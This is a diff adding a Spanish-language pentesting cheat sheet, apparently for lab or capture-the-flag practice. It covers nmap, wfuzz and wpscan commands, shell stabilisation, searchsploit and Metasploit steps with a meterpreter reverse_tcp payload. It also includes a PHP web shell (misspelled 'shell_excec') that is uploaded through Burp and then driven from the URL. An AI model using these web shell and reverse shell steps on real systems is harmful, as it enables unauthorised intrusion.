@@ -1,0 +1,129 @@
+//PAGINAS DE INTERES
+poner en google:
+reverse shell monkey pentester (para buscar formas de obtener una reverse shell via comandos)
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+//NMAP 
+//nmap agilizado
+nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- IP -oG allPorts
+      ^
+      |
+tcp-sync-port-scan                
+
+
+//nmap con puertos ya descubiertos
+nmap -sC -sV -p(pego los puertos) IP -oN targeted
+
+--------------------------------///////\\\\\\\-------------------------------------- 
+
+//WFUZZ ANALIZO DIRECTORIOS EN UN HTTP/HTTPS
+
+wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://IP/FUZZ
+
+wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w /usr/share/wordlists/ext.txt http://IP/FUZZ.FUZ2Z
+
+--------------------------------///////\\\\\\\-------------------------------------- 
+
+//WPSCAN Escaneo de wordpress para sacar informacion
+
+wpscan --url http//IP -e vp,u
+
+--------------------------------///////\\\\\\\-------------------------------------- 
+
+// TRATAMIENTO DE LA TTY
+
+1) le doy Ctrl + Z para poner en segundo plano la consola
+2) Escribo el comando "stty raw -echo" 
+3) "fg" no se va a ver en consola pero le doy enter igual
+4) "reset"
+5) Elijo el tipo de terminal. ej:"xterm"
+6) "export TERM=xterm" porque todavia no esta la xterm
+7) "export SHELL=bash" porque todavia no tengo la /bin/bash
+8) Para las filas y columnas le doy "stty rows 52 columns 187"
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+// ENCONTRAR VULNERABILIDADES CON SEARCHSPLOIT
+
+Para actualizar "searchsploit -u"
+
+searchsploit -x (Nombre del servicio) -w               -m        
+              ^                        ^                ^
+              |                        |                |
+     veo el codigo fuente	    veo url     copia en directorio
+
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+// UTILIDAD METASPLOIT
+
+----PARA ENTRAR A LA MAQUINA VICTIMA----
+
+msfconsole
+
+search <servicio a atacar>
+
+use (nombre del exploit)
+
+seteo("set") los rhost rport y demas
+
+(establezco una reverse/shell) ---> set payload windows/meterpreter/reverse_tcp
+
+show options
+
+seteo("set") los lhost y lport 
+
+exploit
+
+(Parametros de interes abajo)
+
+RHOSTS= remote host
+RPORT= remote port
+target= tipo de windows
+
+----ADENTRO DE LA MAQUINA VICTIMA----
+
+getuid --> Veo quien soy
+
+sysinfo --> Informacion del sistema vulnerado
+
+shell --> Obtengo una shell interactiva
+
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+//EXPLOTACION MANUAL SIN HERRAMIENTAS (DE EXPLOIT) DE POR MEDIO
+
+encuentro la vulnerabilidad con searchsploit
+lo copio en el dir actual
+ 
+Hago lo que dice el exploit (varia casi siempre)
+
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+//BURPSUITE
+
+nos permite interceptar peticiones y modificarlas.
+
+primero de todo hacemos el scope a la maquina victima
+
+----WEBSHELL----
+
+si queremos hacer una web shell simple con php seria de este modo:
+
+primero tenemos que interceptar las peticiones con burp, despues pondriamos este codigo dependiendo de
+que este validando la web: 
+
+<?php
+	echo "<pre>" . shell_excec($_REQUEST['cmd']) . "</pre>";
+?>
+
+Una vez hecho esto tendriamos que darle a forward y veriamos donde se esta almacenando ese archivo que
+acabamos de subir.
+
+Luego, tendriamos que poner en la barra de direcciones lo siguiente: 
+										DATASO:
+http://IP/ruta/hasta/el/archivo.php?cmd=(comando que desees)                       ifconfig=ip a
+
